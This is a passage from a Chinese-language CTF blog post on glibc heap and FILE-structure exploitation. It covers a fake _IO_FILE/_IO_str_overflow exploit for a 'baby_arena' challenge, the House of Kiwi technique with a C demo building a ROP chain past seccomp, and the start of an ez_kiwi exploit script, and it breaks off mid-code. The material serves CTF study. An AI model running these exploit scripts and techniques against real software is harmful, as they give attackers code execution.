class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1430</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>)<br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3ebca0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3e8360</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br>global_max_fast = libc_base + <span class="hljs-number">0x3ed940</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br><span class="hljs-comment"># aw(one_gadget,libc_base+0x3c67f8-8)</span><br>aw(system_addr,global_max_fast - <span class="hljs-number">8</span>)<br>pause()<br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x410</span>+p64(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br><br>add(<span class="hljs-number">0x1430</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h5 id="调试-v2"><a class="header-anchor" href="#调试-v2">¶</a>调试</h5><p>调试拿 <strong>_IO_str_overflow</strong> 简单过一遍。看完了 2.23 后 2.27 只需要明白咋进的 <code>_IO_str_overflow</code> 就行了。</p><p>我们构造的结构体：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200847128.png" alt="image-20220525200847128"></p><p>结构体 vtable 函数表：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200927604.png" alt="image-20220525200927604"></p><p>那么在遍历到我们的结构体调用 <code>_IO_OVERFLOW</code> 实际就是在调用 <code>_IO_str_overflow</code>。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201020570.png" alt="image-20220525201020570"></p><p>一路 si 跟进，最后在预期位置 getshell ：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201106629.png" alt="image-20220525201106629"></p><hr><h2 id="Libc"><a class="header-anchor" href="#Libc">¶</a>??? &lt;= Libc &lt;= ???</h2><blockquote><p>kiwi 是利用路线，必要的话用 husk 过渡，emma 和 pig 是利用方法。</p><footer><strong>风沐云烟</strong></footer></blockquote><p>👴 其实是就是为了写这部分才开的这篇博客。从这里开始才能称作是搞艺术。</p><p><strong>???</strong> 的意思是这下面的几个利用涉及到的思想和手法，从过去一直到未来的一段时间里不会过时。</p><p>你暂时看不到就是 👴 还没写完。</p><h3 id="House-of-Kiwi-libc-2-36我真的哭死"><a class="header-anchor" href="#House-of-Kiwi-libc-2-36我真的哭死">¶</a>House of Kiwi(libc&lt;2.36我真的哭死)</h3><p>先看一下这几个中我最先学习到的 <strong>kiwi</strong> ，由 <code>fmyy</code> 师傅提出，发表于 <a href="https://www.anquanke.com/post/id/235598">安全客</a> 。</p><h4 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h4><h5 id="malloc-assert"><a class="header-anchor" href="#malloc-assert">¶</a>__malloc_assert</h5><ul><li><p>GLIBC 2.32/malloc.c:288</p><p>glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个 <strong>fflush(stderr)</strong> 的函数调用,其中会调用<code>_IO_file_jumps</code> 中的sync指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>(<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br><span class="hljs-built_in">fflush</span> (stderr);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>fflush:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> fflush(s) _IO_fflush (s)</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_fflush (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> _IO_flush_all ();<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">int</span> result;<br>      CHECK_FILE (fp, EOF);<br>      _IO_acquire_lock (fp);<br>      result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>      _IO_release_lock (fp);<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_fflush)<br></code></pre></td></tr></table></figure><p>其中调用了 vtable 对应偏移的 <code>_IO_SYNC</code> 函数。如果你知道低版本的 FSOP 的基本原理，那么大概就知道 <strong>kiwi</strong> 的利用思路了。</p></li></ul><h4 id="使用场景"><a class="header-anchor" href="#使用场景">¶</a>使用场景</h4><ol><li><p>能够触发<code>__malloc_assert</code>,通常是堆溢出导致，但 👴 发现实际过程中大多数都是 🐑 topchunk。</p></li><li><p>能够任意写,修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_file_sync = setcontext + <span class="hljs-number">61</span><span class="hljs-comment">// &amp;_IO_file_jumps + 0x60</span><br></code></pre></td></tr></table></figure><p>和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_helper_jumps + <span class="hljs-number">0xA0</span> and <span class="hljs-number">0xA8</span><br><span class="hljs-comment">//   rsp      rcx</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="俩点说明"><a class="header-anchor" href="#俩点说明">¶</a>俩点说明</h4><p>关于场景 1，🐑 topchunk 有很多种 🐑 法，常用的有：</p><ol><li>直接溢出或者分配个 chunk 去把 topchunk size 扬了</li><li>Largebin Attack 错位打 topchunk size</li><li>Largebin Attack 或者分配个 chunk 过去 🐑 main_arena 中的 topchunk 坑位</li></ol><p>关于场景 2，👴 不得不提一哈，这只是<strong>最初最基本</strong>的 kiwi 需要任意写这个比较强的条件，fmyy 师傅还教了 👴 和其他的 house 一起玩的仅 <code>Largebin Attack</code> 较弱条件思路，具体的话后续的例题应该会有。</p><h4 id="Demo-v2"><a class="header-anchor" href="#Demo-v2">¶</a>Demo</h4><p>fmyy 师傅演示的 DEMO：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span><br><span class="hljs-comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ret pop_rdi_ret+1</span><br><span class="hljs-type">size_t</span> libc_base;<br><span class="hljs-type">size_t</span> ROP[<span class="hljs-number">0x30</span>];<br><span class="hljs-type">char</span> FLAG[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;./flag.txt\x00&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sandbox</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_filter</span> sfi[] =&#123;<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000004</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0xC000003E</span>&#125;,<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x35</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x40000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0xFFFFFFFF</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0000003B</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x7FFF0000</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;<br>    &#125;;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_fprog</span> sfp = &#123;<span class="hljs-number">8</span>, sfi&#125;;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setROP</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rax_ret;<br>    ROP[i++] = <span class="hljs-number">2</span>;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)FLAG;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = syscall_ret;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">3</span>;<br>    ROP[i++] = pop_rdx_r12;<br>    ROP[i++] = <span class="hljs-number">0x100</span>;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)(FLAG + <span class="hljs-number">0x10</span>);<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)read;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">1</span>;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)write;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">setvbuf</span>(stdin,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stdout,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stderr,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">sandbox</span>();<br>    libc_base  = ((<span class="hljs-type">size_t</span>)setvbuf) - <span class="hljs-number">0x81630</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);<br><br>    <span class="hljs-type">size_t</span> magic_gadget = libc_base + <span class="hljs-number">0x53030</span> + <span class="hljs-number">61</span>; <span class="hljs-comment">// setcontext + 61</span><br>    <span class="hljs-type">size_t</span> IO_helper = libc_base + <span class="hljs-number">0x1E48C0</span>; <span class="hljs-comment">// _IO_hel</span><br>    per_jumps;<br>    <span class="hljs-type">size_t</span> SYNC = libc_base + <span class="hljs-number">0x1E5520</span>; <span class="hljs-comment">// sync pointer in _IO_file_jumps</span><br>    <span class="hljs-built_in">setROP</span>();<br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA0</span>/<span class="hljs-number">8</span>) = ROP; <span class="hljs-comment">// 设置rsp</span><br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA8</span>/<span class="hljs-number">8</span>) = ret; <span class="hljs-comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span><br>    *((<span class="hljs-type">size_t</span>*)SYNC) = magic_gadget; <span class="hljs-comment">// 设置fflush(stderr)中调用的指令地址</span><br>    <span class="hljs-comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span><br>    <span class="hljs-type">size_t</span> *top_size = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>) + <span class="hljs-number">0x18</span>);<br>    *top_size = (*top_size)&amp;<span class="hljs-number">0xFFE</span>; <span class="hljs-comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>); <span class="hljs-comment">// 触发assert</span><br>    _exit(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="调试和例题"><a class="header-anchor" href="#调试和例题">¶</a>调试和例题</h4><p>👴 私自认为 <strong>kiwi 简洁但不简单</strong>，简洁到简单改改 demo 就能在其他的题目里打 <strong>ROP</strong> 绕沙箱。又不简单到必须<strong>自己调试</strong>，才能较好地掌握这一利用路线，了解其中细节，以后和其他方法结合起来才能比较从容。</p><h5 id="ez-kiwi"><a class="header-anchor" href="#ez-kiwi">¶</a>ez_kiwi</h5><p>出自 BUUCTF 的 <a href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520迎新赛</a></p><h6 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h6><p>这题挺适合拿来调试 kiwi 的，题目给了个简单的 off-by-one ，👴 认为 off-by-one 是非常白给的漏洞所以不会难。</p><p>同时题目没有给显式的 exit 并且每次进入 menu 前会清除几个 hook ，也是要求我们打 IO 了。</p><p>但是出题人这次所有的题目都没有开 sandbox ，这是个大伏笔，暂按下不表。</p><h6 id="思路-v3"><a class="header-anchor" href="#思路-v3">¶</a>思路</h6><ol><li>off-by-one 打堆重叠改 size 拿到大 chunk</li><li>Free 大 chunk 再拿回来，利用残留指针简单的 leak</li><li>利用重叠堆块里的 chunk 构造 Tcache Poisoning 任意写，打 kiwi</li></ol><h6 id="Exp-v3"><a class="header-anchor" href="#Exp-v3">¶</a>Exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span 